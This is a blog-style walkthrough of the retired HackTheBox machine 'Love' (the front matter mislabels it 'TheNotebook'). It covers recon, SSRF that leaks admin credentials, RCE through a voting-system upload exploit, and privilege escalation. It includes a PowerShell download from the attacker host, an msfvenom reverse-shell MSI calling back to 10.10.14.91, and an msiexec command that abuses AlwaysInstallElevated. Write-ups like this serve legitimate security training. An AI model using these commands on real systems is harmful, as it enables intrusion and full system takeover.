@@ -1,0 +1,277 @@
+---
+layout: walkthrough
+title: HackTheBox - TheNotebook
+date: 2021-08-01 12:00:00 +0200
+img: ChallengeVMs/HTB_Icons/love.png # Add image post (optional)
+status: Retired
+description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
+---
+
+Hi everyone, today we are going to be looking at Love --`10.10.10.239`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Love/Overview.png"  style="width: 50%" />
+</p>
+
+## Information Gathering
+
+In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.
+
+### Nmap Output
+<details>
+
+```bash
+
+sudo nmap -sC -sV 10.10.10.239
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 11:30 EDT
+Nmap scan report for 10.10.10.239
+Host is up (0.19s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE      VERSION
+80/tcp   open  tcpwrapped
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Voting System using PHP
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp open  mysql?
+| fingerprint-strings: 
+|   HTTPOptions, SSLSessionReq, afp: 
+|_    Host '10.10.14.135' is not allowed to connect to this MariaDB server
+5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.91%I=7%D=5/6%Time=60940BD9%P=x86_64-pc-linux-gnu%r(HTT
+SF:POptions,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.135'\x20is\x20not\x
+SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSe
+SF:ssionReq,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.135'\x20is\x20not\x
+SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(afp,4
+SF:B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.135'\x20is\x20not\x20allowed\
+SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
+Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h52m52s, deviation: 4h02m32s, median: 32m50s
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: Love
+|   NetBIOS computer name: LOVE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-05-06T09:04:44-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-05-06T16:04:42
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 66.23 seconds
+
+```
+</details>
+
+
+From the output shown above, we can see that the machine is a Windows machine. There were a lot of ports open, so I started with the web application. Navigating to the web application presented me with a login page for a voting system:
+
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Love/img1.png"  style="width: 80%" />
+</p>
+
+
+While I was looking into the source code, I ran gobuster scans, the output of which is shown below:
+
+<details>
+
+```bash
+vagrant@ko:~/Desktop/HackTheBox/Love$ gobuster dir -u http://10.10.10.239 -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -b 403,404
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:                     http://10.10.10.239
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.0.1
+[+] Timeout:                 10s
+===============================================================
+2021/05/06 11:38:01 Starting gobuster
+===============================================================
+/images (Status: 301)
+/includes (Status: 301)
+/admin (Status: 301)
+/plugins (Status: 301)
+/Admin (Status: 301)
+/Images (Status: 301)
+/Includes (Status: 301)
+/examples (Status: 503)
+/ADMIN (Status: 301)
+/dist (Status: 301)
+/IMAGES (Status: 301)
+/tcpdf (Status: 301)
+/PlugIns (Status: 301)
+/INCLUDES (Status: 301)
+/Plugins (Status: 301)
+===============================================================
+2021/05/06 11:45:32 Finished
+===============================================================
+```
+</details>
+
+The gobuster scans revealed several directories include an admin portal! The portal had username enumeration and the username -- `admin` existed, however I didn't have a password at this stage.
+
+Since I didn't have a way forward with port 80, I looked into port 443, however access was forbidden. Additionally, SMB did not have NULL authentication available. At this point I went back over the nmap scans and saw a subdomain within the SSL certificate.
+
+### Staging Environment
+I added the `staging.love.htb` subdomain to the `/etc/hosts` file and navigated to the webpage:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Love/img2.png"  style="width: 80%" />
+</p>
+
+I looked through the source code and came across a link for `/beta.php`. Navigating the URL provided the following web page:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Love/img3.png"  style="width: 80%" />
+</p>
+
+
+I decided to see if the file was able to contact my host by launching a python simple server:
+
+```bash
+
+vagrant@ko:~/Desktop/HackTheBox/Love$ sudo python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.239 - - [06/May/2021 11:58:53] code 404, message File not found
+10.10.10.239 - - [06/May/2021 11:58:53] "GET /test.php HTTP/1.1" 404 -
+
+```
+
+Alright! I now had a file scanner, I just needed to figure out how to exploit it. 
+
+### Abusing Remote File Inclusion (RFI)
+Using the file scanner, I was able to access remote files by inserting a URL into the field. Using this information, I tried to upload files from my host machine, however I didn't find a way in which to do this.
+
+I decided to try another route, and read files from the hosts IP address. I started by attempting to read the `index.php` file which was successful. Using this train of thought, I tried to navigate the file system but I couldn't figure out a method to get LFI working with it. I tried to access the other open port -- 5000 and it displayed an Administration page including the credentials after browsing to <http://127.0.0.1:5000>:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Love/img4.png"  style="width: 80%" />
+</p>
+
+Using this information, I logged into the admin page <http://10.10.10.239/admin/home.php>:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Love/img5.png"  style="width: 80%" />
+</p>
+
+### VotingSystem Exploitation
+
+File upload is possible via the profile picture functionality that can be used for RCE. After uploading a file, it will be stored in `/images/` and is also accessible without authentication.
+
+I searched for a VotingSystem exploit and came across the following: <https://www.exploit-db.com/exploits/49846>. 
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Love/img6.png"  style="width: 80%" />
+</p>
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Love/img7.png"  style="width: 80%" />
+</p>
+
+
+## Privilege Escalation using Pheobe
+Since I had RCE on the host, I started with some basic enumeration: 
+
+```bat
+C:\Users\Phoebe\Downloads>echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all
+ 
+ 
+whoami: 
+love\phoebe
+Phoebe  
+ 
+Hostname: 
+Love
+ 
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : Love
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B9-9D-6D
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.10.10.239(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+   DNS Servers . . . . . . . . . . . : 8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+```
+
+From there, I uploaded winPEAS to the host using the following PowerShell command:
+
+```powershell
+powershell.exe Invoke-WebRequest -OutFile winpeas.exe -Uri http://10.10.14.91/winPEAS.exe
+```
+
+The output showed that it was possible to exploit  `AlwaysInstallElevated`:
+
+```bat
+[+] Checking AlwaysInstallElevated
+	[?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+	AlwaysInstallElevated set to 1 in HKLM!
+	AlwaysInstallElevated set to 1 in HKCU!
+```
+
+### Exploiting AlwaysInstallElevated
+
+There are a few blog posts describing how to exploit this, including: <https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated>. 
+
+> Windows environments provide a group policy setting which allows a regular user to install a Microsoft Windows Installer Package (MSI) with system privileges. This can be discovered in environments where a standard user wants to install an application which requires system privileges and the administrator would  like to avoid to give temporary local administrator access to a user.
+
+Since both registry entries for **AlwaysInstallElevated** were set to 1, I needed to generate the payload to exploit this:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.91 LPORT=9002 -f msi -o reverse.msi
+```
+
+With the file now on the host, I used the following commands to exploit the **AlwaysInstallElevated** vulnerability:
+
+```bat
+msiexec /quiet /qn /i reverse.msi
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Love/img8.png"  style="width: 80%" />
+</p>
